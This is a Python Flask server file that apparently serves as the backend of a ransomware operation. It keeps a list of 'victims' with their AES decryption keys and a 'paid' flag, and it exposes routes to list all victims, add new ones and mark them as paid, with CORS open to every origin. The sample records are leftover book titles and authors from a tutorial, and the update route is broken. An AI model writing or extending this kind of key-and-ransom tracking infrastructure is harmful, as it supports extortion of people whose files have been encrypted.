import uuid

from flask import Flask, jsonify, request
from flask_cors import CORS


VICTIMS = [
    {
        # 'id': uuid.uuid4().hex,
        'id': 'On the Road',
        'AES_key': 'Jack Kerouac',
        'paid': True
    },
    {
        # 'id': uuid.uuid4().hex,
        'id': 'Harry Potter and the Philosopher\'s Stone',
        'AES_key': 'J. K. Rowling',
        'paid': False
    },
    {
        # 'id': uuid.uuid4().hex,
        'id': 'Green Eggs and Ham',
        'AES_key': 'Dr. Seuss',
        'paid': True
    }
]

# configuration
DEBUG = True

# instantiate the app
app = Flask(__name__)
app.config.from_object(__name__)

# enable CORS
CORS(app, resources={r'/*': {'origins': '*'}})


def remove_victim(victim_id):
    for victim in VICTIMS:
        if victim['id'] == victim_id:
            VICTIMS.remove(victim)
            return True
    return False


# sanity check route
@app.route('/ping', methods=['GET'])
def ping_pong():
    return jsonify('pong!')


@app.route('/victims', methods=['GET'])
def all_victims():
    response_object = {'status': 'success'}
    response_object['victims'] = VICTIMS
    return jsonify(response_object)

@app.route('/victims/add', methods=['POST'])
def add_victim():
    # if request.is_json:
    #     return '400 Not Json'
    post_data = request.get_json()
    response_object = {'status': 'success'}
    VICTIMS.append({
            # 'id': uuid.uuid4().hex,
            'id': post_data.get('victim_id'),
            'AES_key': post_data.get('AES_key'),
            'paid': post_data.get('paid')
        })
    response_object['message'] = 'Victim added!'
    return jsonify(response_object)

@app.route('/victims/<victim_id>', methods=['POST'])
def update_victim():
    # if request.is_json:
    #     return '400 Not Json'
    post_data = request.get_json()
    response_object = {'status': 'success'}
    if post_data.get('paid'):
        pass
    response_object['message'] = 'Victim updated!'
    return jsonify(response_object)


# @app.route('/victims/<victim_id>', methods=['PUT', 'DELETE'])
# def single_victim(victim_id):
#     response_object = {'status': 'success'}
#     if request.method == 'PUT':
#         post_data = request.get_json()
#         response_object['post_data'] = post_data
#         remove_victim(victim_id)
#         VICTIMS.append({
#             # 'id': uuid.uuid4().hex,
#             'id': post_data.get('victim_id'),
#             'AES_key': post_data.get('AES_key'),
#             'paid': post_data.get('paid')
#         })
#         response_object['message'] = 'Victim updated!'
#     if request.method == 'DELETE':
#         response_object['id'] = victim_id
#         if remove_victim(victim_id):
#             response_object['message'] = 'Victim removed!'
#         else:
#             response_object['status'] = 'False'
#             response_object['message'] = 'Victim failed!'
#     return jsonify(response_object)


if __name__ == '__main__':
    app.run()